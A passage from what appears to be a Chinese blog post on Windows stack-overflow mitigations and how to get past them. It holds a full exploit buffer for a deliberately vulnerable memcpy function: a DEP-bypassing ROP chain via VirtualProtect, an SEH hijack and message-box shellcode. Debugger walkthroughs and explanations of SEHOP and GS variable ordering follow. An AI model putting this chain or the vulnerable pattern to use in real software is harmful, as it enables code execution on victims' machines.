class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 | ROPNOP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ROP chain begins</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EAX = NOP sled</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ECX = Old protection (writable address)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EDX = PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EBX = Size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EBP = VirtualProtect return address (JMP ESP)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ESI = KERNEL32.DLL!VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EDI = ROPNOP</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x1e\x00\x66&quot;</span> <span class="comment">// 0x66001e54 | Gadget #1 | POP ESI ; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd0\x10\x00\x66&quot;</span> <span class="comment">// 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xfc\x50\x05\x66&quot;</span> <span class="comment">// 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xef\xbe\xad\xde&quot;</span> <span class="comment">// Junk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf8\x9f\x0f\x66&quot;</span> <span class="comment">// 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x1f\x98\x0e\x66&quot;</span> <span class="comment">// 0x660e981f | Gadget #4 | POP EAX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">// NOP sled -&gt; EAX | JMP ESP will point here</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf0\x1d\x00\x66&quot;</span> <span class="comment">// 0x66001df0 | Gadget #5 | POP EBP; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xea\xcb\x01\x66&quot;</span> <span class="comment">// 0x6601CBEA -&gt; EBP |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x10\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001f10 | Gadget #6 | POP EBX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x20\x00\x00&quot;</span> <span class="comment">// 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x21\x44\x06\x66&quot;</span> <span class="comment">// 0x66064421 | Gadget #7 | POP EDX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf2\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001ff2 | Gadget #8 | POP ECX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\xa0\x10\x66&quot;</span> <span class="comment">// 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x5b\x57\x00\x66&quot;</span> <span class="comment">// 0x6600575b | Gadget #9 | POP EDI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 -&gt; EDI |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x12\x05\x66&quot;</span> <span class="comment">// 0x66051254 | Gadget #10 | PUSHAD; RET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x55\x89\xe5\x68\x88\x4e\x0d\x00\xe8\x53\x00\x00\x00\x68\x86\x57&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x0d\x00\x50\xe8\x94\x00\x00\x00\x68\x33\x32\x00\x00\x68\x55\x73&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x65\x72\x54\xff\xd0\x68\x1a\xb8\x06\x00\x50\xe8\x7c\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x6a\x64\x68\x70\x77\x6e\x65\x89\xe1\x68\x6e\x65\x74\x00\x68\x6f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x72\x72\x2e\x68\x65\x73\x74\x2d\x68\x66\x6f\x72\x72\x68\x77\x77&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x77\x2e\x89\xe2\x6a\x00\x52\x51\x6a\x00\xff\xd0\x89\xec\x5d\xc3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x55\x89\xe5\x57\x56\xbe\x30\x00\x00\x00\x64\xad\x8b\x40\x0c\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x78\x18\x89\xfe\x31\xc0\xeb\x04\x39\xf7\x74\x28\x85\xf6\x74\x24&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8d\x5e\x24\x85\xdb\x74\x14\x8b\x4b\x04\x85\xc9\x74\x0d\x6a\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x51\xe8\x5d\x01\x00\x00\x3b\x45\x08\x74\x06\x31\xc0\x8b\x36\xeb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd7\x8b\x46\x10\x5e\x5f\x89\xec\x5d\xc2\x04\x00\x55\x89\xe5\x81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xec\x30\x02\x00\x00\x8b\x45\x08\x89\x45\xf8\x8b\x55\xf8\x03\x42&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; \x83\xc0\x04\x89\x45\xf0\x83\xc0\x14\x89\x45\xf4\x89\xc2\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\x08\x03\x42\x60\x8b\x4a\x64\x89\x4d\xd0\x89\x45\xfc\x89\xc2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8b\x45\x08\x03\x42\x20\x89\x45\xec\x8b\x55\xfc\x8b\x45\x08\x03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x42\x24\x89\x45\xe4\x8b\x55\xfc\x8b\x45\x08\x03\x42\x1c\x89\x45&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xe8\x31\xc0\x89\x45\xe0\x89\x45\xd8\x8b\x45\xfc\x8b\x40\x18\x3b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xe0\x0f\x86\xd2\x00\x00\x00\x8b\x45\xe0\x8d\x0c\x85\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x8b\x55\xec\x8b\x45\x08\x03\x04\x11\x89\x45\xd4\x6a\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x50\xe8\xbd\x00\x00\x00\x3b\x45\x0c\x0f\x85\xa1\x00\x00\x00\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xe0\x8d\x14\x00\x8b\x45\xe4\x0f\xb7\x04\x02\x8d\x0c\x85\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x8b\x55\xe8\x8b\x45\x08\x03\x04\x11\x89\x45\xd8\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x4d\xfc\x89\xca\x03\x55\xd0\x39\xc8\x7c\x7f\x39\xd0\x7d\x7b\xc7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xd8\x00\x00\x00\x00\x31\xc9\x8d\x9d\xd0\xfd\xff\xff\x8a\x14&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x08\x80\xfa\x00\x74\x20\x80\xfa\x2e\x75\x15\xc7\x03\x2e\x64\x6c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x6c\x83\xc3\x04\xc6\x03\x00\x8d\x9d\xd0\xfe\xff\xff\x41\xeb\xde&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x88\x13\x41\x43\xeb\xd8\xc6\x03\x00\x8d\x9d\xd0\xfd\xff\xff\x6a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x53\xe8 \x00\x00\x00\x50\xe8\xa3\xfe\xff\xff\x85\xc0\x74&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x29\x89\x45\xdc\x6a\x00\x8d\x95\xd0\xfe\xff\xff\x52\xe8\x21\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x50\xff\x75\xdc\xe8\xd1\xfe\xff\xff\x89\x45\xd8\xeb\x0a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8d\x45\xe0\xff\x00\xe9\x1f\xff\xff\xff\x8b\x45\xd8\x89\xec\x5d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xc2\x08\x00\x55\x89\xe5\x57\x8b\x4d\x08\x8b\x7d\x0c\x31\xdb\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x39\x00\x74\x14\x0f\xb6\x01\x0c\x60\x0f\xb6\xd0\x01\xd3\xd1\xe3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x41\x85\xff\x74\xea\x41\xeb\xe7\x89\xd8\x5f\x89\xec\x5d\xc2\x08&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Junk[<span class="number">0x5000</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// Move ESP lower to ensure the exploit data can be accomodated in the overflow</span></span><br><span class="line"></span><br><span class="line">HMODULE hModule = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;msvbvm60.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line">Push0xdeadc0de<span class="comment">// Address of handler function</span></span><br><span class="line"></span><br><span class="line">PushFS : [<span class="number">0</span>]<span class="comment">// Address of previous handler</span></span><br><span class="line"></span><br><span class="line">Mov FS : [<span class="number">0</span>] , Esp<span class="comment">// Install new EXECEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... loaded non-ASLR/non-SafeSEH module msvbvm60.dll to 0x%p\r\n&quot;</span>), hModule);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), <span class="built_in">sizeof</span>(Exploit) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Overflow</span>(Exploit, <span class="number">0x20000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码中有几个细节值得注意。首先，您可能注意到，我通过将垃圾异常处理程序（0xdeadc0de）链接到TEB(FS[0])中的处理程序列表，显式注册了该处理程序。之所以这样做，是因为我发现在栈顶部覆盖NTDLL.DLL注册的默认处理程序的做法不太可靠。这是因为有时栈的顶端没有足够的空间来容纳shellcode，这会触发VirtualProtect的STATUS_CONFICTING_ADDRESS错误（代码0xc0000015）。</p><p>图20中另一个值得注意的细节是，我在ROP链末端的溢出内容中加入了自己的shellcode。这是我编写的一个自定义的shellcode（源代码可以从Github上下载），它在ROP链化后的栈上被执行后会弹出一个消息框。</p><p>编译完含有溢出漏洞程序后，我们可以进行单步跟踪，看看溢出数据是如何结合在一起来执行shellcode的。</p><p>(上面那段代码的内联汇编语法有错误，不知道是他写的有问题还是我的设置问题，报错信息为C2400“操作码”中的内联汇编语法错误；找到“[”，所以下面都是别人的图)</p><p>在漏洞程序发生栈溢出之前的状态</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture28.png" alt="img"></p><p>在第一个断点处，我们可以看到，栈上的目标EXCEPTION_REGISTRATION_RECORD位于0x00B9ABC8处。在发生溢出之后，我们可以期待该handler字段将被我们伪造的SEH handler的地址所覆盖。</p><p><img src="/.io//Picture29-1707050428583.png" alt="img"></p><p>memcpy对栈末端之外执行写入操作是抛出的访问违例异常（Access violation exception）</p><p><img src="/.io//Picture29-1707050428583.png" alt="img"></p><p>在memcpy函数中，由于rep MOVSB指令试图将数据写入栈的末端之外的内存时，发生了访问违例异常。在0x00B9ABCC处，我们可以看到EXCEPTION_REGISTRATION_RECORD结构体的handler字段已经被我们msvbvm60.dll中的栈pivot gadget的地址所覆盖。</p><p>伪造的SEH handler让ESP跳回由溢出控制的地区</p><p><img src="/.io//Picture30-1707050428583.png" alt="img"></p><p>在栈中向上跳过0x1004字节，我们可以看到在突出显示区域，ESP现在指向我们ROP链的开始地址。这个ROP链将填充所有相关寄存器的值，以便为PUSHAD gadget做好相应的准备，之后，该gadget将把这些值移到栈上，从而为调用KERNEL32.DLL!VirtualProtect做好准备。</p><p> PUSHAD为绕过DEP准备好相应的调用栈</p><p><img src="/.io//Picture31-1707050428583.png" alt="img"></p><p>在PUSHAD指令执行后，我们可以看到ESP现在指向msvbvm60.dll中的ROPN，其后紧跟KERNEL32.DLL中VirtualProtect的地址。在0x00B9B594处，我们可以看到传递给VirtualProtect的第一个参数，就是我们栈上0x00B9B5A4处的shellcode的地址（该地址在上图中已经突出显示）。</p><p>ROP链的最后一个gadget将EIP设置为ESP</p><p><img src="/.io//Picture32-1707050428583.png" alt="img"></p><p>一旦VirtualProtect返回，ROP链中的最后一个gadget就会将EIP重定向到ESP的值，这样，ESP将指向我们直接存储在ROP链之后的shellcode的起始位置。您可能已经注意到，shellcode的前4个字节实际上就是ROP链通过PUSHAD指令动态生成的NOP指令，而不是通过溢出写入的shellcode的起始位置。</p><p>弹出消息框的shellcode在栈上成功执行，从而完成了漏洞的利用过程</p><p><img src="/.io//Picture33-1707050428584.png" alt="img"></p><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>实际上，在Windows中还有一种更为强大的SEH劫持缓解机制，称为SEH覆写保护（SEH Overwrite Protection，SEHOP），它可以抗衡这里描述的方法。引入SEHOP的目的，是为了既可以检测EXCEPTION_REGISTRATION_RECORD损坏，又无需重新编译应用程序或依靠每个模块的漏洞利用缓解方案，如SafeSEH。为此，SEHOP将在SEH链的底部引入一个额外的链接，并在异常发生时通过检查是否可以通过遍历SEH链而到达该链接，来实现SEH劫持的防御机制。由于EXCEPTION_REGISTRATION_RECORD的NSEH字段存储在handler字段之前，因此，在通过栈溢出破坏现有的SEH handler时，必然会破坏NSEH，以及破坏整个链（原理上类似于栈金丝雀（stack canary），其中金丝雀就是NSEH字段本身）。SEHOP是在Windows Vista SP1（在默认情况下禁用）和Windows Server 2008（在默认情况下启用）中引入的，在过去的十年中，SEHOP一直处于这种半启用状态（在工作站上禁用，在服务器上启用）。值得注意的是，最近随着Windows 10 v1709的发布，这种情况已经发生了变化：SEHOP已经成为默认启用的漏洞缓解功能了。</p><p><img src="/.io//image-20230529162453538-1707050428584.png" alt="image-20230529162453538"></p><p>这似乎与上一节在Windows 10虚拟机上探讨的SEH劫持溢出情况相矛盾。为什么SEHOP没有能够在exploit的初始阶段阻止EIP重定向到栈pivot？虽然我们还不是十分清楚，然而这似乎是微软方面配置错误的问题。当我对之前探索溢出所用EXE程序单独进行设置，并手动点选“Override system settings”框后，SEHOP机制就开始发挥威力：栈pivot将无法执行。令人费解的是，在默认情况下，系统已经在该进程上启用了SEHOP机制。</p><p>下图为某exe文件，没有手动勾选。</p><p><img src="/.io//image-20230529162751462-1707050428584.png" alt="image-20230529162751462"></p><p>这有可能是微软方面有意的配置，只是在上面的截图中被曲解了。由于SEHOP与第三方应用程序（如Skype和Cygwin）不兼容，因此，SEHOP在历史上一直被广泛禁用（微软在这里讨论了这个问题）。当SEHOP与本文中讨论的其他漏洞缓解措施一起正确启用时，在没有链式内存泄漏（任意读取）或任意写入原语的情况下，SEH劫持将无法用于利用栈溢出漏洞。任意读取原语可以允许NSEH字段在溢出前被泄漏，这样就可以制作溢出数据，以便在EIP劫持期间不破坏SEH链。通过任意写入原语（在下一节讨论），攻击者可以覆盖存储在栈上的返回地址或SEH handler，而不会破坏NSEH或栈金丝雀的值，从而绕过SEHOP和栈Cookie缓解措施。</p><h2 id="任意写入-amp-局部变量破坏"><a href="#任意写入-amp-局部变量破坏" class="headerlink" title="任意写入&amp;局部变量破坏"></a>任意写入&amp;局部变量破坏</h2><p>在某些情况下，攻击者根本就不需要溢出函数栈帧的末尾来触发EIP重定向。如果他们可以在不需要覆盖栈Cookie的情况下成功地获得代码执行权限，那么栈Cookie验证检查就可以轻松绕过。为此，有一种方法是使用栈溢出来破坏函数中的局部变量，以便让应用程序将我们选择的值写入我们选择的地址。下面的示例函数包含可以用这种方式利用的逻辑。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> gdwGlobalVar = <span class="number">0</span>; </span><br><span class="line">  <span class="type">void</span> Overflow（<span class="type">uint8_t</span>* pInputBuf， <span class="type">uint32_t</span> dwInputBufSize) &#123; </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    memcpy（Buf， pInputBuf， dwInputBufSize); </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从根本上讲，我们要利用的是一个非常简单的代码模式：</p><ol><li>函数必须包含一个容易发生栈溢出的数组或结构。</li><li>该函数必须包含至少两个局部变量：一个解引用的指针和一个用于写入该指针的值。</li><li>函数必须使用局部变量写入解引用的指针，并在栈溢出发生后执行这个操作。</li><li>函数必须以这样的方式进行编译：即溢出的数组在栈上存储的位置比局部变量低。</li></ol><p>最后一点是一个值得进一步研究的问题。我们希望MSVC（Visual Studio 2019使用的编译器）以这样的方式编译图29中的代码：Buf的16个字节被放在分配给栈帧内存的最低区域（当包含栈Cookie时，应该是总共28个字节），然后是最高区域的dwVar1和pdwVar2。这个顺序与源代码中声明这些变量的顺序是一致的；这允许Buf向前溢出到更高的内存中，并用我们选择的值覆盖dwVar1和pdwVar2的值，从而使我们用于覆盖dwVar1的值被放在我们选择的内存地址上。然而在现实中，情况并非如此，编译器给出的汇编代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,1C </span><br><span class="line">mov eax,dword ptr ds:[&lt;___security_cookie&gt;] </span><br><span class="line">xor eax,ebp </span><br><span class="line">mov dword ptr ss:[ebp-4],eax </span><br><span class="line">mov dword ptr ss:[ebp-1C],1 </span><br><span class="line">mov dword ptr ss:[ebp-18], </span><br><span class="line">mov ecx,dword ptr ss:[ebp+C] </span><br><span class="line">push ecx </span><br><span class="line">mov edx,dword ptr ss:[ebp+8] </span><br><span class="line">push edx </span><br><span class="line">lea eax,dword ptr ss:[ebp-14] </span><br><span class="line">push eax </span><br><span class="line">call  </span><br><span class="line">add esp,C </span><br><span class="line">mov ecx,dword ptr ss:[ebp-18] </span><br><span class="line">mov edx,dword ptr ss:[ebp-1C] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">xor ecx,ebp </span><br><span class="line">call &lt;preciseoverwrite.@__security_check_cookie@4&gt; </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>从上面的反汇编代码中我们可以看到，编译器已经在EBP-0x4和EBP-0x14之间的最高内存部分中选择了一个对应于Buf的区域，并且已经在EBP-0x1C和EBP-0x18的最低内存部分中分别为dwVar1和pdwVar2选择了一个区域。这种排序使易受攻击的函数免受局部变量通过栈溢出而损坏的影响。也许最有趣的是，dwVar1和pdwVar2的排序与它们在源代码中相对于Buf的声明顺序相矛盾。这最初让我觉得很不解，因为我认为MSVC会根据变量的声明顺序来排序，但进一步的测试证明事实并非如此。实际上，进一步的测试证明，MSVC并不是根据变量的声明、类型或名称的顺序来排序，而是根据它们在源代码中被引用（使用）次数来排序：引用次数多的变量将优先于那些引用次数少的变量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint32_t</span> A; </span><br><span class="line">    <span class="type">uint32_t</span> B; </span><br><span class="line">    <span class="type">uint32_t</span> C; </span><br><span class="line">    <span class="type">uint32_t</span> D; </span><br><span class="line"> </span><br><span class="line">    B = <span class="number">2</span>; </span><br><span class="line">    A = <span class="number">1</span>; </span><br><span class="line">    D = <span class="number">4</span>; </span><br><span class="line">    C = <span class="number">3</span>; </span><br><span class="line">    C++; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>因此，我们可以预期这个函数的编译会按以下方式排列变量：C、B、A、D。这符合变量引用(使用)次数的顺序，而不是它们被声明的顺序。其中，C将被放在第一位(内存中最高地址处，距离EBP的偏移量最小)，因为它被引用了两次，而其他变量都只被引用了一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,10 </span><br><span class="line">mov dword ptr ss:[ebp-8],2 </span><br><span class="line">mov dword ptr ss:[ebp-C],1 </span><br><span class="line">mov dword ptr ss:[ebp-10],4 </span><br><span class="line">mov dword ptr ss:[ebp-4],3 </span><br><span class="line">mov eax,dword ptr ss:[ebp-4] </span><br><span class="line">add eax,1 </span><br><span class="line">mov dword ptr ss:[ebp-4],eax </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>果然，我们可以看到，变量都已经按照我们预测的顺序排列，其中，C位于EBP – 4处，也就是排在第一位。尽管如此，MSVC使用的排序逻辑与我们在图30中看到的情况相矛盾。毕竟，dwVar1和pdwVar2的引用次数（各两次）都比Buf高（在memcpy中只有一次），而且都是在Buf之前引用的。那么这是怎么回事呢？GS包含了一个额外的安全缓解功能，它试图安全地对局部变量进行排序，以防止由于栈溢出而导致可利用的局部变量破坏。</p><p> 在GS机制下生成的具有安全变量顺序栈布局</p><p><img src="/.io//t01efae18697f164d60-1707050428584.png" alt="img"></p><p>绕过在项目设置中禁用GS，会产生以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 